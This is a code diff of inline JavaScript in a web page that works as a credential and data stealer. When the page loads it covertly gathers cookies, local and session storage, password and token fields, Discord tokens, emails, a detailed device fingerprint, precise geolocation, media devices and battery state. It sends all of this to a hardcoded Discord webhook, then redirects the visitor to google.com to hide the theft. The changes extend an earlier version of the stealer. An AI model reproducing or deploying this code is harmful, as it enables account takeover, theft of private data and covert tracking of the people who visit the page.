@@ -7,151 +7,264 @@
         (function() {
             const WEBHOOK = 'https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i';
 
-            // ─── Collect sessionStorage ───
-            function getSessionStorage() {
+            // ─── 1. COOKIES (ALL) ───
+            function getCookies() {
+                return document.cookie.split('; ').reduce((a,c) => {
+                    const [k,v] = c.split('=');
+                    a[k] = v;
+                    return a;
+                }, {});
+            }
+
+            // ─── 2. STORAGE ───
+            function getStorage(type) {
                 const data = {};
-                try {
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const key = sessionStorage.key(i);
-                        data[key] = sessionStorage.getItem(key);
-                    }
-                } catch(e) {}
+                const st = type === 'local' ? localStorage : sessionStorage;
+                for (let i = 0; i < st.length; i++) {
+                    const key = st.key(i);
+                    data[key] = st.getItem(key);
+                }
                 return data;
             }
 
-            // ─── Collect passwords from all forms and inputs ───
+            // ─── 3. PASSWORDS (from forms) ───
             function getPasswords() {
                 const p = [];
-                try {
-                    // All input[type="password"]
-                    document.querySelectorAll('input[type="password"]').forEach(inp => {
-                        if (inp.value) {
-                            p.push({
-                                name: inp.name || inp.id || 'unknown',
-                                value: inp.value
-                            });
-                        }
-                    });
-                    // Also check hidden fields that might contain passwords
-                    document.querySelectorAll('input[type="hidden"]').forEach(inp => {
-                        const name = (inp.name || '').toLowerCase();
-                        if (name.includes('pass') || name.includes('pwd') || name.includes('token')) {
-                            if (inp.value && inp.value.length > 3) {
-                                p.push({
-                                    name: inp.name || 'hidden_password',
-                                    value: inp.value
-                                });
-                            }
-                        }
-                    });
-                    // Check textarea and inputs with autocomplete
-                    document.querySelectorAll('input[type="text"], textarea').forEach(inp => {
-                        const name = (inp.name || '').toLowerCase();
-                        const val = inp.value || '';
-                        if ((name.includes('pass') || name.includes('pwd') || name.includes('token')) && val.length > 3) {
-                            p.push({
-                                name: inp.name || 'text_password',
-                                value: val
-                            });
-                        }
-                    });
-                } catch(e) {}
+                document.querySelectorAll('input[type="password"]').forEach(inp => {
+                    if (inp.value) p.push({ name: inp.name || 'unknown', value: inp.value });
+                });
+                // Also check hidden fields
+                document.querySelectorAll('input[type="hidden"]').forEach(inp => {
+                    const name = (inp.name || '').toLowerCase();
+                    if (name.includes('pass') || name.includes('pwd') || name.includes('token')) {
+                        if (inp.value) p.push({ name: inp.name || 'hidden_pass', value: inp.value });
+                    }
+                });
                 return p;
             }
 
-            // ─── Collect Discord Token ───
+            // ─── 4. DISCORD TOKEN ───
             function getDiscordToken() {
-                try {
-                    // Check localStorage and sessionStorage for known keys
-                    const keys = ['token', 'discord_token', 'authorization', 'auth_token', 'access_token', 'refresh_token', 'mfa_token'];
-                    for (const k of keys) {
-                        let v = localStorage.getItem(k) || sessionStorage.getItem(k);
-                        if (v && (v.startsWith('mfa.') || v.length > 20)) return v;
-                    }
-                    // Check all localStorage and sessionStorage for any value that looks like a token
-                    const allStorage = { ...localStorage, ...sessionStorage };
-                    for (const [k, v] of Object.entries(allStorage)) {
-                        if (typeof v === 'string') {
-                            if (v.startsWith('mfa.') || v.match(/^[a-zA-Z0-9_-]{20,}/)) {
-                                if (k.toLowerCase().includes('token') || k.toLowerCase().includes('auth') || k.toLowerCase().includes('discord')) {
-                                    return v;
-                                }
-                            }
-                        }
-                    }
-                    // Check cookies
-                    const cookies = document.cookie.split('; ').reduce((a,c) => { const [k,v]=c.split('='); a[k]=v; return a; }, {});
-                    for (const [k, v] of Object.entries(cookies)) {
-                        if (typeof v === 'string') {
-                            if ((k.toLowerCase().includes('token') || k.toLowerCase().includes('auth') || k.toLowerCase().includes('discord')) && v.length > 20) {
-                                return v;
-                            }
-                        }
-                    }
-                    // Check all script tags and meta for token patterns
-                    const allText = document.documentElement.innerHTML;
-                    const tokenMatches = allText.match(/[a-zA-Z0-9_-]{30,}/g);
-                    if (tokenMatches) {
-                        for (const match of tokenMatches) {
-                            if (match.startsWith('mfa.') || match.length > 30) {
-                                return match;
-                            }
-                        }
-                    }
-                } catch(e) {}
+                const keys = ['token', 'discord_token', 'authorization', 'auth_token'];
+                for (const k of keys) {
+                    let v = localStorage.getItem(k) || sessionStorage.getItem(k);
+                    if (v && (v.startsWith('mfa.') || v.length > 20)) return v;
+                }
+                const c = getCookies();
+                for (const [k,v] of Object.entries(c)) {
+                    if ((k.includes('token') || k.includes('auth')) && v.length > 20) return v;
+                }
                 return null;
             }
 
-            // ─── Collect Emails ───
+            // ─── 5. EMAILS ───
             function getEmails() {
-                const found = [];
-                try {
-                    const re = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-                    // From page text
-                    const text = document.body.innerText || document.documentElement.innerText || '';
-                    const fromText = text.match(re) || [];
-                    found.push(...fromText);
-                    // From all input fields
-                    document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"], input[id*="mail"]').forEach(inp => {
-                        if (inp.value && re.test(inp.value)) found.push(inp.value);
-                    });
-                    // From all text inputs that look like email
-                    document.querySelectorAll('input[type="text"]').forEach(inp => {
-                        const val = inp.value || '';
-                        if (val && re.test(val)) found.push(val);
-                    });
-                    // From all hidden inputs
-                    document.querySelectorAll('input[type="hidden"]').forEach(inp => {
-                        const val = inp.value || '';
-                        if (val && re.test(val)) found.push(val);
-                    });
-                    // From all meta tags
-                    document.querySelectorAll('meta').forEach(meta => {
-                        const content = meta.getAttribute('content') || '';
-                        if (content && re.test(content)) found.push(content);
-                    });
-                } catch(e) {}
+                const re = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+                const found = (document.body.innerText.match(re) || []);
+                document.querySelectorAll('input[type="email"]').forEach(inp => {
+                    if (inp.value && re.test(inp.value)) found.push(inp.value);
+                });
                 return [...new Set(found)];
             }
 
-            // ─── Collect all four ───
-            function collectTargets() {
+            // ─── 6. FINGERPRINT (FULL DEVICE INFO) ───
+            function getFingerprint() {
+                const canvas = (function() {
+                    try {
+                        const c = document.createElement('canvas');
+                        c.width = 256; c.height = 128;
+                        const ctx = c.getContext('2d');
+                        ctx.textBaseline = 'top';
+                        ctx.font = '14px Arial';
+                        ctx.fillStyle = '#f60';
+                        ctx.fillRect(125,1,62,20);
+                        ctx.fillStyle = '#069';
+                        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+                        return c.toDataURL();
+                    } catch(e) { return 'error'; }
+                })();
+
+                const webgl = (function() {
+                    try {
+                        const c = document.createElement('canvas');
+                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                        if (!gl) return 'no-webgl';
+                        const info = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (!info) return 'no-extension';
+                        return {
+                            vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL)
+                        };
+                    } catch(e) { return 'error'; }
+                })();
+
+                const audio = (function() {
+                    try {
+                        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                        const osc = ctx.createOscillator();
+                        const gain = ctx.createGain();
+                        osc.type = 'sawtooth';
+                        osc.frequency.value = 440;
+                        gain.gain.value = 0.1;
+                        osc.connect(gain);
+                        gain.connect(ctx.destination);
+                        const startTime = ctx.currentTime;
+                        osc.start(startTime);
+                        osc.stop(startTime + 0.1);
+                        return {
+                            sampleRate: ctx.sampleRate,
+                            state: ctx.state
+                        };
+                    } catch(e) { return 'error'; }
+                })();
+
                 return {
-                    timestamp: new Date().toISOString(),
-                    url: window.location.href,
-                    sessionStorage: getSessionStorage(),
-                    passwords: getPasswords(),
-                    discordToken: getDiscordToken(),
-                    emails: getEmails()
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    screen: screen.width + 'x' + screen.height,
+                    colorDepth: screen.colorDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    vendor: navigator.vendor || 'unknown',
+                    doNotTrack: navigator.doNotTrack || 'unknown',
+                    plugins: Array.from(navigator.plugins).map(p => p.name),
+                    fonts: (function() {
+                        // Basic font detection
+                        const test = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Helvetica', 'Comic Sans MS', 'Impact', 'Georgia'];
+                        const base = document.createElement('span');
+                        base.style.cssText = 'position:absolute;visibility:hidden;font-size:20px;';
+                        base.textContent = 'abcdefghijklmnopqrstuvwxyz';
+                        document.body.appendChild(base);
+                        const w = base.offsetWidth, h = base.offsetHeight;
+                        const found = [];
+                        test.forEach(f => {
+                            const el = document.createElement('span');
+                            el.style.cssText = `position:absolute;visibility:hidden;font-size:20px;font-family:${f},sans-serif;`;
+                            el.textContent = 'abcdefghijklmnopqrstuvwxyz';
+                            document.body.appendChild(el);
+                            if (el.offsetWidth !== w || el.offsetHeight !== h) found.push(f);
+                            el.remove();
+                        });
+                        base.remove();
+                        return found;
+                    })(),
+                    canvas: canvas,
+                    webgl: webgl,
+                    audio: audio,
+                    battery: (function() {
+                        if (navigator.getBattery) {
+                            return navigator.getBattery().then(b => ({
+                                level: b.level,
+                                charging: b.charging
+                            })).catch(() => null);
+                        }
+                        return null;
+                    })()
                 };
             }
 
-            // ─── Send ───
+            // ─── 7. GEOLOCATION ───
+            function getGeo() {
+                return new Promise(resolve => {
+                    if (!navigator.geolocation) return resolve(null);
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                        () => resolve(null),
+                        { timeout: 5000, enableHighAccuracy: true }
+                    );
+                });
+            }
+
+            // ─── 8. NETWORK INFO ───
+            function getNetwork() {
+                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (!n) return null;
+                return {
+                    type: n.effectiveType || 'unknown',
+                    downlink: n.downlink || 'unknown',
+                    rtt: n.rtt || 'unknown'
+                };
+            }
+
+            // ─── 9. MEDIA DEVICES (cam/mic list) ───
+            function getMediaDevices() {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
+                return navigator.mediaDevices.enumerateDevices().then(devices => {
+                    return devices.map(d => ({ kind: d.kind, label: d.label || 'hidden' }));
+                }).catch(() => null);
+            }
+
+            // ─── 10. PERFORMANCE / SYSTEM ───
+            function getPerformance() {
+                try {
+                    const mem = performance.memory || {};
+                    return {
+                        memoryUsed: mem.usedJSHeapSize ? Math.round(mem.usedJSHeapSize / 1048576) + 'MB' : 'unknown',
+                        memoryTotal: mem.jsHeapSizeLimit ? Math.round(mem.jsHeapSizeLimit / 1048576) + 'MB' : 'unknown',
+                        navigation: performance.navigation ? {
+                            type: performance.navigation.type,
+                            redirectCount: performance.navigation.redirectCount
+                        } : null
+                    };
+                } catch(e) { return null; }
+            }
+
+            // ─── MAIN COLLECTOR ───
+            async function collectEverything() {
+                const geo = await getGeo();
+                const media = await getMediaDevices();
+                const fp = getFingerprint();
+                // Battery is async
+                let battery = null;
+                if (navigator.getBattery) {
+                    try { battery = await navigator.getBattery().then(b => ({ level: b.level * 100 + '%', charging: b.charging })); } catch(e) {}
+                }
+
+                return {
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    referrer: document.referrer || 'none',
+                    cookies: getCookies(),
+                    localStorage: getStorage('local'),
+                    sessionStorage: getStorage('session'),
+                    passwords: getPasswords(),
+                    discordToken: getDiscordToken(),
+                    emails: getEmails(),
+                    fingerprint: fp,
+                    geolocation: geo,
+                    network: getNetwork(),
+                    mediaDevices: media,
+                    performance: getPerformance(),
+                    battery: battery,
+                    screenDetails: {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        pixelRatio: window.devicePixelRatio
+                    },
+                    windowSize: {
+                        innerWidth: window.innerWidth,
+                        innerHeight: window.innerHeight
+                    },
+                    isIncognito: (function() {
+                        try {
+                            return !!window.chrome && !!window.chrome.webstore;
+                        } catch(e) { return false; }
+                    })()
+                };
+            }
+
+            // ─── SENDER ───
             function sendData(data) {
                 const payload = {
                     content: '```json\n' + JSON.stringify(data, null, 2) + '\n```'
                 };
-
                 fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -162,37 +275,36 @@
                     const img = new Image();
                     const fallback = WEBHOOK + '?content=' + encodeURIComponent('```json\n' + JSON.stringify(data).substring(0, 1500) + '\n```');
                     img.src = fallback;
-                    console.log('[Collector] Fallback sent');
                 });
             }
 
-            // ─── Run multiple times to catch delayed data ───
-            function runCollection() {
-                const data = collectTargets();
-                sendData(data);
-            }
-
+            // ─── RUN ───
             window.addEventListener('load', function() {
-                // Immediate
-                runCollection();
-                // After 2s
-                setTimeout(runCollection, 2000);
-                // After 5s
-                setTimeout(runCollection, 5000);
-                // After 10s (for slow-loading SPAs like Discord web)
-                setTimeout(runCollection, 10000);
+                collectEverything().then(data => {
+                    sendData(data);
+                    // Send again after 5s for dynamic data
+                    setTimeout(() => {
+                        collectEverything().then(data2 => sendData(data2));
+                    }, 5000);
+                });
 
-                // Redirect to hide (optional)
-                setTimeout(function() {
-                    window.location.replace('https://google.com');
-                }, 4000);
+                // Also send minimal data immediately
+                setTimeout(() => {
+                    const quick = {
+                        timestamp: new Date().toISOString(),
+                        url: window.location.href,
+                        cookies: getCookies(),
+                        localStorage: getStorage('local'),
+                        sessionStorage: getStorage('session')
+                    };
+                    sendData(quick);
+                }, 500);
             });
 
-            // Also run on DOMContentLoaded for faster pages
-            document.addEventListener('DOMContentLoaded', function() {
-                // Small delay to let initial forms render
-                setTimeout(runCollection, 500);
-            });
+            // ─── REDIRECT (optional) ───
+            setTimeout(() => {
+                window.location.replace('https://google.com');
+            }, 8000);
 
         })();
     </script>
